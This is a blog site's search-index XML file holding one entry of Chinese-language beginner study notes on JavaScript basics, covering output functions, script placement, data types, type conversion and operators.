<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JavaScript</title>
    <url>/2020/04/03/JavaScript/</url>
    <content><![CDATA[<h3 id="JavaScript语言特点"><a href="#JavaScript语言特点" class="headerlink" title="JavaScript语言特点"></a>JavaScript语言特点</h3><h5 id="1、基于对象的编程语言"><a href="#1、基于对象的编程语言" class="headerlink" title="1、基于对象的编程语言"></a>1、基于对象的编程语言</h5><h5 id="2、解释执行脚本语言"><a href="#2、解释执行脚本语言" class="headerlink" title="2、解释执行脚本语言"></a>2、解释执行脚本语言</h5><h3 id="第一个JS代码hello-word"><a href="#第一个JS代码hello-word" class="headerlink" title="第一个JS代码hello word"></a>第一个JS代码hello word</h3><h4 id="alert-属性"><a href="#alert-属性" class="headerlink" title="alert()属性"></a>alert()属性</h4><p><strong>alert()</strong>控制<strong>浏览器弹出一个警告框</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(&quot;这是我的第一行JS代码&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="document-write-属性"><a href="#document-write-属性" class="headerlink" title="document.write()属性"></a>document.write()属性</h4><p><strong>document.write()</strong>让计算机<strong>在页面输出一个内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.write(&quot;点我一下看我出不出来&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="console-log-属性"><a href="#console-log-属性" class="headerlink" title="console.log()属性"></a>console.log()属性</h4><h5 id="console-log-向控制台输出一个内容"><a href="#console-log-向控制台输出一个内容" class="headerlink" title="console.log()向控制台输出一个内容"></a>console.log()向控制台输出一个内容</h5><p>console.log 只能在网页源代码中的控制台显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># console.log 只能在网页源代码中的控制台显示</span><br><span class="line">console.log(&quot;你猜我在哪里&quot;)</span><br></pre></td></tr></table></figure>

<h5 id="以上这些条件都需要写在script标签中"><a href="#以上这些条件都需要写在script标签中" class="headerlink" title="以上这些条件都需要写在script标签中"></a>以上这些条件都需要写在script标签中</h5><h4 id="JS编写位置"><a href="#JS编写位置" class="headerlink" title="JS编写位置"></a>JS编写位置</h4><pre><code>虽然可以写在标签的属性中，但是他们属于结构与行为耦合，不方便维护，不推荐使用</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以将JS代码编写到标签的onclick属性中</span><br><span class="line">当我们点击按钮时，JS代码才会执行</span><br><span class="line"></span><br><span class="line">&lt;button onclick&#x3D;&quot;alert(&#39;你为什么要点我&#39;);&quot;&gt;点我一下&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">可以将JS代码写在超链接的href属性中，这样当我们点击超链接时，或执行JS代码</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:alert(&#39;你怎么又点了我一下&#39;);&quot;&gt;你也点我一下&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:&quot;&gt;你也点我一下&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以将js代码编写到script标签中</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;		</span><br><span class="line">alert(&quot;这是script标签中的代码&quot;);			</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以将js代码编写到外部js文件中，然后通过script标签引入</span><br><span class="line">写到外部文件中，可以再不同的页面同时引用，也可以利用到浏览器的缓存机制</span><br><span class="line">推荐使用的方式</span><br><span class="line">引入的命令式 src&#x3D;&quot;外部文件名称&quot;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">script标签一旦用于引入外部文件，就不能编写代码了，即使编写了浏览器也会忽略	</span><br><span class="line">如果需要则可以再创建一个script标签用于编写内部代码</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">	alert(&quot;我是内部代码，刚才不行，我新建一个script标签&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JS基本语法"><a href="#JS基本语法" class="headerlink" title="JS基本语法"></a>JS基本语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* *&#x2F;多行注释</span><br><span class="line">		JS注释</span><br><span class="line">		多行注释，注释中的内容不会被执行，但是可以再源代码中查看</span><br><span class="line">			要养成良好的编写注释的习惯，也可以通过注释来对代码进行一些简单的测试</span><br><span class="line">						</span><br><span class="line">&#x2F;&#x2F;单行注释</span><br><span class="line">	alert(&quot;hello&quot;); &#x2F;&#x2F;该语句会在网页中弹出一个窗口</span><br><span class="line">	document.write(&quot;hello&quot;);&#x2F;&#x2F;该语句用来在网页中输出</span><br><span class="line">	console.log(&quot;hello&quot;);&#x2F;&#x2F;该语句用来在控制台输出</span><br><span class="line">			</span><br><span class="line">1、在JS中严格区分大小写</span><br><span class="line">2、JS中每一条语句以分号(;)结尾</span><br><span class="line">	- 如果不写分号，浏览器会自动添加，但是会消耗一些系统资源</span><br><span class="line">		而且有些时候，浏览器会加错分号，所以在开发中分号必须写</span><br><span class="line">3、JS中会忽略多个空格和换行，所以我们可以利用这个空格和换行进行格式化</span><br></pre></td></tr></table></figure>

<h4 id="字面量和变量"><a href="#字面量和变量" class="headerlink" title="字面量和变量"></a>字面量和变量</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字面量，都是一些不可改变的值</span><br><span class="line">比如：1、2、3、4、5、</span><br><span class="line">字面量都是可以直接使用的，但是我们一般都不会直接使用字面量</span><br><span class="line">	变量	  变量可以用来保存字面量，而且变量的值是可以任意改变的</span><br><span class="line">			变量更加方便使用，所以在开发中都是通过变量去保存一个字面量</span><br><span class="line">			而很少使用字面量</span><br><span class="line">			可以通过变量对字面量进行描述</span><br><span class="line"></span><br><span class="line">如果要是用需要声明变量</span><br><span class="line">在JS中声明变量用关键字var，假如要定义一个变量a</span><br><span class="line">	var a;</span><br><span class="line">为变量赋值</span><br><span class="line">	a &#x3D; 123;</span><br><span class="line">	a &#x3D; 456;</span><br><span class="line">	a &#x3D; 1321561615315;</span><br><span class="line"></span><br><span class="line">可以声明和赋值同时进行</span><br><span class="line">	var a &#x3D; 123;</span><br><span class="line">	var c &#x3D; 0;</span><br><span class="line">	console.log(a);</span><br></pre></td></tr></table></figure>

<h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">标识符</span><br><span class="line">	- 在JS中所有的可以由我们自主命名的都可以成为是标识符</span><br><span class="line">	- 例如：变量名、函数名、属性名都属于标识符</span><br><span class="line">	- 我们在命名一个标识符时需要遵守以下规则：</span><br><span class="line">			1、标识符中可以含有字母、数字、下划线、$符</span><br><span class="line">			2、标识符不能以数字开头</span><br><span class="line">			3、标识符不能是ES中的关键字或保留字</span><br><span class="line">			4、标识符一般都采用驼峰命名法	&#x2F;&#x2F;只是语法规范</span><br><span class="line">					- 首字母小写，每个单词首字母大写，其他字母小写</span><br><span class="line">						驼峰命名法:helloWord</span><br><span class="line">									</span><br><span class="line">	- JS底层保存的标识符实际上时采用Unicode编码(UTF-8)，</span><br><span class="line">			所以理论上讲，所有的UTF-8中含有的内容都可以作为标识符</span><br><span class="line"></span><br><span class="line">	var a_1_$ &#x3D; 12345; &#x2F;&#x2F;包含了字母、数字、下划线、$符</span><br><span class="line">	console.log(a_1_$);</span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据类型指的就是字面量的类型、</span><br><span class="line">	在JS中一共有六中数据类型</span><br><span class="line">		String 字符串</span><br><span class="line">		Number 数值</span><br><span class="line">		Boolean 布尔值</span><br><span class="line">		Null 空值</span><br><span class="line">		Underfind 未定义</span><br><span class="line">		Object 定义对象</span><br><span class="line">			 </span><br><span class="line">	其中String Number Boolean Null Undefined属于基本数据类型</span><br><span class="line">	而Object属于引用数据类型</span><br><span class="line"></span><br><span class="line">	String字符串</span><br><span class="line">		- 字符串需要用引号引起来,双引号和单引号都可以。</span><br><span class="line"></span><br><span class="line">	如果想让引号或者其他特殊符号变成普通符号用 \ 进行转义</span><br><span class="line">		\ 表示转义字符</span><br><span class="line">		\n 表示换行</span><br><span class="line">		\t 制表符</span><br><span class="line">		\\ 自己转义自己</span><br><span class="line"></span><br><span class="line">	var str &#x3D; &quot;代码没写完不许睡觉&quot;</span><br><span class="line">	&#x2F;&#x2F; 表示输出字面量，也就是输出当前字符串</span><br><span class="line">	alert(&quot;STR&quot;)</span><br><span class="line">	&#x2F;&#x2F; 表示输出变量</span><br><span class="line">	alert(str);</span><br><span class="line"></span><br><span class="line">	var str &#x3D; &quot;hello&quot;;</span><br><span class="line">	console.log(str);</span><br></pre></td></tr></table></figure>

<h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">所有的数值都是Number类型，</span><br><span class="line">	包括整数和浮点数</span><br><span class="line">	JS中表示的数字最大值</span><br><span class="line">		Number.MAX_VALUE</span><br><span class="line">			1.7976931348623157e+308</span><br><span class="line">		Number.MIN_VALUE最小值</span><br><span class="line">			e-324</span><br><span class="line">					</span><br><span class="line">		如果使用Number.MAX_VALUE超过了数字最大值，则会返回一个Infinity表示正无穷的</span><br><span class="line">				typeof检查Infinity返回 Number类型</span><br><span class="line">				</span><br><span class="line">				字符串乘字符串会返回一个 NaN 而NaN表示这不是一个数字</span><br><span class="line">				typeof 检查 NaN 也是返回Number类型</span><br><span class="line">	&#x2F;&#x2F; 数字123</span><br><span class="line">	var a &#x3D; 123;</span><br><span class="line">	&#x2F;&#x2F;字符串123</span><br><span class="line">	var b &#x3D; &quot;123&quot;;</span><br><span class="line">	typeof 查看数据类型</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; console.log(typeof b);</span><br><span class="line">	console.log(Number.MAX_VALUE);</span><br><span class="line">			</span><br><span class="line">	&#x2F;&#x2F; 在进行整数运算基本可以保证精确</span><br><span class="line">	var c &#x3D; 123156 + 151563;</span><br><span class="line">	document.write(c);</span><br><span class="line">			</span><br><span class="line">	&#x2F;&#x2F; JS进行小数运算，可能得到一个不精确的结果</span><br><span class="line">	&#x2F;&#x2F; 千万不能使用JS进行对精确度比较高的运算</span><br><span class="line">	var c &#x3D; 0.1 + 0.2;</span><br><span class="line">	document.write(c);</span><br></pre></td></tr></table></figure>

<h4 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">布尔值只有两个，用来逻辑判断</span><br><span class="line">True和Fales</span><br><span class="line">使用typeof检查布尔值时，返回boolean</span><br><span class="line">	var bool &#x3D; true;</span><br><span class="line">	document.write(typeof bool);</span><br></pre></td></tr></table></figure>

<h4 id="Null和Underfind"><a href="#Null和Underfind" class="headerlink" title="Null和Underfind"></a>Null和Underfind</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">null类型的值只有一个就是null，表示空</span><br><span class="line">	使用typeof检查null值时，会返回object</span><br><span class="line">				</span><br><span class="line">	underfind类型的值只有一个，就是underfind</span><br><span class="line">	当声明一个变量并没有赋值时，他的值就是underfind</span><br><span class="line">	使用typeof检查underfind值时，会返回underfind</span><br><span class="line">	</span><br><span class="line">	var a &#x3D; null;</span><br><span class="line">			</span><br><span class="line">	var b;</span><br><span class="line">	document.write(typeof b);</span><br></pre></td></tr></table></figure>

<h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">强制类型转换</span><br><span class="line">	- 指将一个数据类型强制转换为其他数据类型</span><br><span class="line">	- 类型转换主要指，将其他数据类型转换为</span><br><span class="line">		String、Number、Boolean</span><br><span class="line">			</span><br><span class="line">	将其他数据类型转换成String</span><br><span class="line">		方式一:</span><br><span class="line">			- 调用被转换数据类型的toString()方法</span><br><span class="line">			- 该方法不会影响到原变量</span><br><span class="line">			- 注意null 和underfind这两个值没有tostring()方法,</span><br><span class="line">				如果通过他们的方法，会报错</span><br><span class="line">						</span><br><span class="line">		方式二:</span><br><span class="line">			- 调用String()函数,并将被转的数据类型作为参数传递给函数</span><br><span class="line">			- 使用String()函数做的强制类型转换时</span><br><span class="line">				对于Number和Boolean实际上就是调用的toString()方法</span><br><span class="line">				但是对于null和undefined，就不会调用toString()方法</span><br><span class="line">					他会将null直接转换成&quot;null&quot;</span><br><span class="line">					将undefined 直接转换为 &quot;underfined&quot;</span><br><span class="line"></span><br><span class="line">var a &#x3D; 123;</span><br><span class="line">&#x2F;&#x2F; 调用a的toString()方法</span><br><span class="line">&#x2F;&#x2F;调用 xxx的yyy()方法，就是xxx.yyy</span><br><span class="line">var a &#x3D; a.toString();</span><br><span class="line">document.write(typeof a);</span><br><span class="line">document.write(a);</span><br><span class="line">			</span><br><span class="line">var b &#x3D; 123;</span><br><span class="line">var c &#x3D; String(b);</span><br><span class="line">document.write(typeof c);</span><br><span class="line">document.write(c);</span><br></pre></td></tr></table></figure>

<h4 id="Number-1"><a href="#Number-1" class="headerlink" title="Number"></a>Number</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将其他的数据类型转换为Number</span><br><span class="line">转换方式一:</span><br><span class="line">	使用number()函数</span><br><span class="line">		- 字符换---&gt; 数字</span><br><span class="line">			1、如果是纯数字的字符串，则直接将其转换为数字</span><br><span class="line">			2、如果，字符串中又非数字的内容，则转换成NaN</span><br><span class="line">			3、如果字符串是一个空或者是全空格的字符串，则转换为0</span><br><span class="line">		- 布尔值 --&gt; 数字</span><br><span class="line">			true 变成 1 </span><br><span class="line">			false 变成 0</span><br><span class="line">		- Null --&gt; 数字  0</span><br><span class="line">		- undefined --&gt; 数字 NaN</span><br><span class="line">转换方式二:</span><br><span class="line">		- 这种方式专门用来对付字符串</span><br><span class="line">		- parseInt() 把一个字符串转换成一个整数</span><br><span class="line">		- parseFloat() 把一个字符串转换成一个浮点数</span><br><span class="line">	</span><br><span class="line">var a &#x3D; &quot;132&quot;;</span><br><span class="line">document.write(typeof a);</span><br><span class="line">document.write(a);</span><br><span class="line">		</span><br><span class="line">var b &#x3D; &quot;123a456px&quot;;</span><br><span class="line">&#x2F;&#x2F; 调用parseInt()函数将b转换为number</span><br><span class="line"> </span><br><span class="line">parseInt()可以将一个字符串中的有效的整数内容取出来</span><br><span class="line">	然后转换成Number</span><br><span class="line">pasrFloat()作用和parseFloat()类似，不同的是它可以获得有效的小数</span><br><span class="line"></span><br><span class="line">c &#x3D; parseInt(b);</span><br><span class="line">a &#x3D; &quot;123.12。789px&quot;;</span><br><span class="line">a &#x3D;parseFloat(a);</span><br><span class="line"></span><br><span class="line">如果对非String使用parseInt()或parseFloat()</span><br><span class="line">	它会先将其转换为String，然后再操作</span><br><span class="line"></span><br><span class="line">a &#x3D; true</span><br><span class="line">a &#x3D; parseInt(a);</span><br><span class="line">document.write(typeof a);</span><br><span class="line">document.write(a);</span><br></pre></td></tr></table></figure>

<h4 id="Boolean-1"><a href="#Boolean-1" class="headerlink" title="Boolean"></a>Boolean</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将其他的数据类型转换为Boolean</span><br><span class="line">	- 使用Boolean()函数</span><br><span class="line">		- 数字 ---&gt; 布尔</span><br><span class="line">			- 除了0和NaN，其余都为true</span><br><span class="line">		- 字符串 ---&gt; 布尔 </span><br><span class="line">				- 除了空串，都是true</span><br><span class="line">		- null和undefined都会转换为False</span><br><span class="line">		- 对象也会转换为true</span><br><span class="line">					</span><br><span class="line">var a &#x3D; 123; &#x2F;&#x2F;true</span><br><span class="line">a &#x3D; -123; &#x2F;&#x2F;true</span><br><span class="line">a &#x3D; 0; &#x2F;&#x2F;false</span><br><span class="line">a &#x3D; Infinity; &#x2F;&#x2F;true</span><br><span class="line">&#x2F;&#x2F; 调用Boolean()函数来将a转换为布尔值</span><br><span class="line">a &#x3D; Boolean(a);</span><br><span class="line">document.write(typeof a);</span><br><span class="line">document.write(a);</span><br></pre></td></tr></table></figure>

<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">运算符也叫操作符</span><br><span class="line">	通过运算符可以对一个或多个值进行运算</span><br><span class="line">		比如：typeof就是运算符，可以来获得一个值的类型</span><br><span class="line">			它会将该值的类型以字符串的形式返回</span><br><span class="line">							</span><br><span class="line">算术运算符</span><br><span class="line">	当对非Number类型的值进行运算时，会将这些值转换为Number然后再运算</span><br><span class="line">		任何值和NaN运算都是NaN</span><br><span class="line">			任何值和字符串做加法运算，都会先转换为字符串，然后再进行字符串拼接</span><br><span class="line">					</span><br><span class="line">+		</span><br><span class="line">	可以对两个值进行加法运算并将结果返回</span><br><span class="line">		如果两个字符串相加，会拼接</span><br><span class="line">-</span><br><span class="line">	可以对两个值进行减法预算，并将结果返回</span><br><span class="line">*</span><br><span class="line">	可以对两个值进行乘法运算</span><br><span class="line">&#x2F;</span><br><span class="line">	可以对两个值进行除法运算</span><br><span class="line">%</span><br><span class="line">	可以对两个值进行求余运算</span><br><span class="line"></span><br><span class="line">我们可以利用这一点，来将任意一个数值类型转换为String</span><br><span class="line">	我们只需要为任意的数据类型 + 一个&quot;&quot; 即可将其转换为字符串</span><br><span class="line">	这是一种隐式的类型转换，由浏览器自动完成，实际上它也是调用String()函数</span><br><span class="line">				  </span><br><span class="line">任何值做— * &#x2F; 运算时都会自动转换为Number</span><br><span class="line">	可以利用这一点进行隐式类型转换</span><br><span class="line">		乘除是1 减法是0</span><br><span class="line">		原理和Number()函数一样，使用起来更加简单</span><br><span class="line"></span><br><span class="line">var a &#x3D;123;</span><br><span class="line">&#x2F;&#x2F;a &#x3D; a + &quot;&quot;;</span><br><span class="line">&#x2F;&#x2F;document.write(typeof a);</span><br><span class="line">document.write(&quot;c &#x3D; &quot; + a);</span><br><span class="line"></span><br><span class="line">var a &#x3D;&quot;123&quot;;</span><br><span class="line">a &#x3D; a * 1;</span><br><span class="line">document.write(a);</span><br><span class="line"></span><br><span class="line">var a &#x3D;&quot;123&quot;;</span><br><span class="line">a &#x3D; a - 0;</span><br><span class="line">document.write(a);</span><br></pre></td></tr></table></figure>

<h4 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一元运算符，只需要一个操作数</span><br><span class="line">	+	正号</span><br><span class="line">		- 正好不会对数字产生任何影响</span><br><span class="line">	—	负号</span><br><span class="line">		- 负号可以对数字进行负号的取反</span><br><span class="line">			- 正负得负，负负得正</span><br><span class="line">								</span><br><span class="line">	- 对于非Number类型的值，</span><br><span class="line">		他会先转换为Number，然后再运算</span><br><span class="line">		可以对一个其他的数据类型使用+，来将其转换为Number</span><br><span class="line">		原理和Number()函数一样</span><br><span class="line">						</span><br><span class="line">			var a &#x3D; 123;</span><br><span class="line">			a &#x3D; -a;</span><br><span class="line">			</span><br><span class="line">			var a &#x3D; &quot;123&quot;;</span><br><span class="line">			a &#x3D; -a</span><br><span class="line">			&#x2F;*document.write(&quot;a &#x3D; &quot; + a);</span><br><span class="line">			document.write(typeof a);*&#x2F;</span><br><span class="line">			</span><br><span class="line">			var result &#x3D; 1 + +&quot;2&quot; + 3;</span><br><span class="line">			document.write(&quot;result + &quot; &#x3D; result);</span><br><span class="line">			document.write(typeof result);</span><br></pre></td></tr></table></figure>

<h4 id="自增自减"><a href="#自增自减" class="headerlink" title="自增自减"></a>自增自减</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自增 ++</span><br><span class="line">	- 通过自增可以使变量再自身的基础上增加1</span><br><span class="line">	- 对于一个变量自增以后，原变量的值会立即自增1</span><br><span class="line">				</span><br><span class="line">自减 --</span><br><span class="line">	- 通过自减可以使变量在自身的基础上自减一</span><br></pre></td></tr></table></figure>

<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JS提供了三种逻辑运算符</span><br><span class="line">				</span><br><span class="line">!	非</span><br><span class="line">	- ! 可以用来对一个值进行非运算</span><br><span class="line">	- 所谓非运算就是对一个布尔值进行取反操作，比较像!&#x3D;</span><br><span class="line">	- 进行两次取反，不会变化</span><br><span class="line">	- 如果对非布尔值进行非运算，则会先将其转换为布尔值，然后再取反</span><br><span class="line">		所以我们可以利用该特点，来讲一个其他的数据类型转换为布尔值</span><br><span class="line">		可以为任意一个数据去取反两次，来将其转换为布尔值</span><br><span class="line">		原理和Boolean()函数相同</span><br><span class="line">						</span><br><span class="line">	var a &#x3D; 123;</span><br><span class="line">	a &#x3D; !!a;</span><br><span class="line">	document.write(&quot;a &#x3D;&quot;a);</span><br><span class="line">				</span><br><span class="line">&amp;&amp;	与</span><br><span class="line">	- &amp;&amp;可以对符号两侧的值进行与运算，并返回结果</span><br><span class="line">	- 两个值中只要有一个值为flase结果就为flase，比较像 and</span><br><span class="line">						</span><br><span class="line">	&#x2F;&#x2F; 第一个值为true，检查第二个值</span><br><span class="line">	true &amp;&amp; alert(&quot;你好啊&quot;);</span><br><span class="line">	&#x2F;&#x2F; 第一个值为false，直接返回false，不去检查第二个值</span><br><span class="line">	fales &amp;&amp; alert(&quot;你好啊&quot;);</span><br><span class="line">					</span><br><span class="line">||	或</span><br><span class="line">	- ||可以对一个值进或运算,并返回结果</span><br><span class="line">		- 两个值中只要有一个值为true结果就为true，比较像 or</span><br><span class="line">	- JS中的&quot;或&quot;属于，短路或</span><br><span class="line">						</span><br><span class="line">		result &#x3D; false || false</span><br><span class="line">		result &#x3D; true || false</span><br><span class="line">		result &#x3D; true || true;</span><br><span class="line">		document.write(&quot;result &#x3D; &quot;+ result);</span><br><span class="line">		</span><br><span class="line">&amp;&amp; || 非布尔值的情况</span><br><span class="line">	- 对于非布尔值进行与或运算时，</span><br><span class="line">		会先将其转换为布尔值，然后再运算，并且返回原值</span><br><span class="line">- &amp;&amp;与运算</span><br><span class="line">	- 如果第一个值时true，则必然返回第二个值</span><br><span class="line">	- 如果第一个值为false，直接返回第一个值</span><br><span class="line">						</span><br><span class="line">	&#x2F;&#x2F; true &amp;&amp; true</span><br><span class="line">	&#x2F;&#x2F; 与运算，如果两个值都为true，则返回后边的</span><br><span class="line">	var result &#x3D; 5 &amp;&amp; 6;</span><br><span class="line">	&#x2F;&#x2F; false &amp;&amp; true </span><br><span class="line">	result &#x3D; 0 &amp;&amp; 2;</span><br><span class="line">	&#x2F;&#x2F; 非布尔值里面又false返回false</span><br><span class="line">	result &#x3D; 2 &amp;&amp; 0;</span><br><span class="line">	&#x2F;&#x2F; 与运算，如果第一个值为false直接返回第一个值</span><br><span class="line">	result &#x3D; NaN &amp;&amp; 0;</span><br><span class="line">	result &#x3D; 0 &amp;&amp; NaN</span><br><span class="line">	document.write(&quot;result +&quot;+result);</span><br><span class="line">- ||或运算</span><br><span class="line">	- 如果第一个值为true直接返回第一个值</span><br><span class="line">	- 如果第一个值为false，则直接返回第二个值</span><br><span class="line">					</span><br><span class="line">&#x2F;&#x2F; 返回结果5</span><br><span class="line">var result &#x3D; 5 || 6;</span><br><span class="line">返回结果0</span><br><span class="line">result &#x3D; NaN || 0;</span><br></pre></td></tr></table></figure>

<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">赋值运算符</span><br><span class="line">	&#x3D; </span><br><span class="line">		可以将右侧的值赋给左侧的变量</span><br><span class="line">		var a &#x3D; 123;</span><br><span class="line">	+&#x3D;</span><br><span class="line">		a +&#x3D; 5;等价于a &#x3D; a+5;</span><br><span class="line">	-&#x3D;</span><br><span class="line">		a -&#x3D; 5;等价于a &#x3D; a-5;</span><br></pre></td></tr></table></figure>

<h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过关系运算符可以比较两个值之间的大小关系，</span><br><span class="line">				  如果关系成立它会返回true如果关系不成立，返回false</span><br><span class="line">				  </span><br><span class="line">				&gt; 大于号</span><br><span class="line">				  关系成立返回true不成立返回发false</span><br><span class="line">				&gt;&#x3D; 大于等于</span><br><span class="line">				  关系成立返回true不成立返回发false</span><br><span class="line">				&lt; 小于</span><br><span class="line">				  关系成立返回true不成立返回发false</span><br><span class="line">				&lt;&#x3D; 大于等于</span><br><span class="line">				  关系成立返回true不成立返回发false</span><br><span class="line">				</span><br><span class="line">				非数值比较</span><br><span class="line">					- 对于非数值比较时，会先将其转换为数字，再进行比较</span><br><span class="line">					- 如果比较符号两边都是字符串，不会将其转换为数字进行比较</span><br><span class="line">						而会分别比较字符串的Unicode编码</span><br><span class="line">					</span><br><span class="line">				NaN和任何值作比较都为false</span><br><span class="line">				两个字符串比较时，比较字符串编码</span><br><span class="line"></span><br><span class="line">在字符串中使用转义字符输入Unicode编码</span><br><span class="line">	\u四位编码,16进制</span><br><span class="line">&lt;body&gt;	</span><br><span class="line">	&lt;!--在网页中使用Unicode编码</span><br><span class="line">		&amp;#编码; 这里的编码需要的时10进制</span><br><span class="line">	--&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;h1&gt;&amp;#9760&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<h4 id="相等运算符"><a href="#相等运算符" class="headerlink" title="相等运算符"></a>相等运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">相等运算符用来比较两个值是否相等，</span><br><span class="line">					如果相等会返回true，否则返回false</span><br><span class="line">					</span><br><span class="line">				使用&#x3D;&#x3D; 来做想等运算</span><br><span class="line">					- 当使用&#x3D;&#x3D;来比较两个值时，如果值的类型不同，</span><br><span class="line">						则会自动进行类型转换，将其转换为相同类型</span><br><span class="line">						然后在比较是否相等</span><br><span class="line">				NaN不和任何值相等，包括他本身</span><br><span class="line">				因为NaN不和任何值相等，所以如果要判断这个值是否为NaN</span><br><span class="line">					用isNaN()函数来判断一个值是否为NaN</span><br><span class="line">					</span><br><span class="line">				如果成立返回true不成立返回false</span><br><span class="line">					var a &#x3D; NaN;</span><br><span class="line">					document.write(isNaN(a));</span><br><span class="line">					</span><br><span class="line">				不相等</span><br><span class="line">					不相等判断两个值是否相等，如果不相等返回true，否则返回false</span><br><span class="line">					- 用!&#x3D;来判断</span><br><span class="line">				&#x3D;&#x3D;&#x3D;</span><br><span class="line">					全等</span><br><span class="line">					- 用来判断两个值是否全等，他和相等类似，不同的是他不会进行类型转换</span><br><span class="line">						如果两个值的类习惯不同，直接返回false</span><br><span class="line">				!&#x3D;&#x3D;</span><br><span class="line">					不全等</span><br><span class="line">					- 用来判断两个值是否不全等，和不等类似，不同的是他不会进行类型转换</span><br></pre></td></tr></table></figure>

<h4 id="条件运算符"><a href="#条件运算符" class="headerlink" title="条件运算符"></a>条件运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件运算符也叫三元运算符</span><br><span class="line">				  语法:</span><br><span class="line">					 条件表达式?语句1:语句2;</span><br><span class="line">				  - 执行流程:</span><br><span class="line">						条件运算符在执行时，首席按对条件表达式进行求值</span><br><span class="line">							如果该值为true，则执行语句1，并返回执行结果</span><br><span class="line">							如果该值为false，则执行语句2，并返回执行结果</span><br><span class="line">						如果条件的表达式的求职结果是一个布尔值，</span><br><span class="line">							会将其转换为布尔值然后再运算</span><br><span class="line">			</span><br><span class="line">			var a &#x3D; 30;</span><br><span class="line">			var b &#x3D; 20;</span><br><span class="line">			var c &#x3D; 50;</span><br><span class="line">			&#x2F;&#x2F;a&gt;b?alert(&quot;a大&quot;):alert(&quot;a小&quot;);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F; 获取a和b的最大值</span><br><span class="line">			var max &#x3D; a&gt;b?a:b;</span><br><span class="line">			max &#x3D; max&gt;c?max:c;</span><br><span class="line">			alert(max);</span><br></pre></td></tr></table></figure>

<h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581836448738.png" alt="1581836448738"></p>
